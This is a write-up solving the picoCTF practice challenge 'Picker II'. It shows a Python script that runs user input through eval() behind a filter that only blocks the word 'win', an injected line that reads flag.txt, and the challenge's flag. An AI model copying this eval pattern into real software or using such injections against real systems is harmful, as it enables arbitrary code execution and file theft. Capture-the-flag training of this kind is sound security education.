# Picker II
This was a challenge listed exclusively for the Pico Gym.  It's listed as Medium and categorized as a Binary Exploitation challenge.  
Direct Link:  https://play.picoctf.org/practice/challenge/401

## Description
The Description reads:
> Can you figure out how this program works to get the flag?

## Hints
There is one hint:
> Can you do what win does with your input to the program?

# Solving
## My Thoughts
I generally prefer real-world applicable challenges but this one was fun!

## Source Code
Let's take a look at the source code first, I'm cutting out irrelevant sections and adding comments:

``` python
import sys

# Exits the program when called
def exit():
  sys.exit(0)

# A win function, calling this will print out the flag
def win():
  # This line will not work locally unless you create your own 'flag.txt' in
  #   the same directory as this script
  # Reads in the flag file and stores the results in the flag variable.
  flag = open('flag.txt', 'r').read()
  #flag = flag[:-1]
  # Strips whitespace from the flag variable.
  flag = flag.strip()
  # Initiates an empty string named str_flag
  str_flag = ''
  # Loops through each character in the flag variable
  for c in flag:
    # Does weird stuff for some reason
    str_flag += str(hex(ord(c))) + ' '
  # Prints the flag
  print(str_flag)

# A function that is made to ensure the user can't directly call the win function.
def filter(user_input):
  if 'win' in user_input:
    return False
  return True

# Loops continuously unless there's an error
while(True):
  try:
    # Gets the user's input
    user_input = input('==> ')
    # Makes sure the user's input doesn't contain the text win.
    if( filter(user_input) ):
      # Eval will evaluate a string as though it's actual python code
      eval(user_input + '()')
    else:
      print('Illegal input')
  except Exception as e:
    print(e)
    break
```

So, they key here is that eval section.  It doesn't just simply call an existing function, it executes the input as actual code!

Let's mess around with it a bit:

``` bash
==> print('yo')
yo
'NoneType' object is not callable
```

As expected, we can execute arbitrary python code!  Let's try to read that file:

``` bash
==> print(open("flag.txt").read())
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}
'NoneType' object is not callable
```

Woah, that easy! We got our flag!
